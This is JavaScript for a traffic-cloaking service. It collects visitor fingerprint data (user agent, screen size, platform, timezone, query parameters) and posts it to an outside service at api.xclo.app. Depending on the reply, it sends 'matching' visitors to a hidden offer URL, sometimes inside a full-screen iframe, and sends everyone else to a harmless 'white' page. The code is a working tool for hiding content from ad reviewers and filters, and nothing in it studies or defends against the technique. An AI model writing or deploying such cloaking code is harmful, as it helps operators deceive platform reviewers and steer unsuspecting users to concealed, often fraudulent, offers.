  // === FUNCTION SECTION ===
  const parseParams = () => Object.fromEntries(new URLSearchParams(location.search));

  const appendUtm = (url, params) => {
    const utm = Object.entries(params)
      .filter(([k]) => k.startsWith("utm_"))
      .map(([k,v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");
    return utm ? url + (url.includes("?") ? "&" : "?") + utm : url;
  };

  const applyOptUtm = (params) => {
    OPT_UTM.split("|").forEach(entry => {
      const [k, v] = entry.split("=");
      if (k && v && !params[k]) params[k] = v;
    });
    return params;
  };

  const resolveMultiOffer = (code) => {
    if (!MULTI_OFFER_ENABLED) return DEFAULT_OFFER_URL;
    return MULTI_OFFER_DATA.split("|").reduce((u, e) => {
      const [c, url] = e.split(";");
      return c.toUpperCase() === code.toUpperCase() ? url.trim() : u;
    }, DEFAULT_OFFER_URL);
  };

function renderOffer(method, url) {
  if (method === 'iframe') {
    document.write(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>${CAMPAIGN_NAME}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <style>
          html, body {
            margin: 0; padding: 0; height: 100%; width: 100%;
            overflow: hidden; background: #fff;
          }
          iframe {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            width: 100%; height: 100%;
            border: none;
            z-index: 999999;
          }
        </style>
      </head>
      <body>
        <iframe src="${url}" allowfullscreen webkitallowfullscreen mozallowfullscreen></iframe>
      </body>
      </html>
    `);
} else if (method === 'meta') {
  window.location.replace(url);
  } else {
    window.location.href = url;
  }
}

  // === MAIN EXECUTION ===
  (async () => {
    const queryParams = parseParams();
    const appliedParams = applyOptUtm({ ...queryParams });
    const queryString = location.search.replace(/^\?/, '');

    const payload = {
      license: LICENSE_KEY,
      campaign_name: CAMPAIGN_NAME,
      cloaking_config: CLOAKING_CONFIG,
      server_data: {
        HTTP_USER_AGENT: navigator.userAgent,
        HTTP_ACCEPT_LANGUAGE: navigator.language,
        QUERY_STRING: queryString,
        SCREEN_WIDTH: screen.width,
        SCREEN_HEIGHT: screen.height,
        PLATFORM: navigator.platform,
        TIMEZONE: Intl.DateTimeFormat().resolvedOptions().timeZone,
        COOKIES_ENABLED: navigator.cookieEnabled,
        JS_ENABLED: true,
        __FROM_JS__: true
      },
      params: queryParams
    };

    try {
      const res = await fetch("https://api.xclo.app/js.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      const raw = await res.text();
      let json;
      try { json = JSON.parse(raw); } catch (e) {
        json = { error: "❌ JSON Parse Error", raw };
      }

      document.getElementById("cloak-overlay").remove();

      if (DEBUG_MODE) {
        const dbg = document.getElementById("debug");
        dbg.style.display = "block";
        dbg.textContent = "=== PAYLOAD ===\n" + JSON.stringify(payload, null, 2)
                        + "\n\n=== RESPONSE ===\n" + JSON.stringify(json, null, 2);
        return;
      }

      if (json.reason === "invalid") {
        const dbg = document.getElementById("debug");
        dbg.style.display = "block";
        dbg.textContent = "⚠️ License / Domain Invalid\n" + JSON.stringify(json.data, null, 2);
        return;
      }

      if (json.match === true) {
        let url = resolveMultiOffer(json.data?.country || "");
        if (INCLUDE_UTM) url = appendUtm(url, appliedParams);
        renderOffer(OFFER_METHOD, url);
      } else {
        window.location.href = WHITE_URL;
      }

    } catch (err) {
      document.getElementById("cloak-overlay").remove();
      document.body.innerHTML = `<pre>❌ ERROR:\n${err.stack || err.message}</pre>`;
    }
  })();
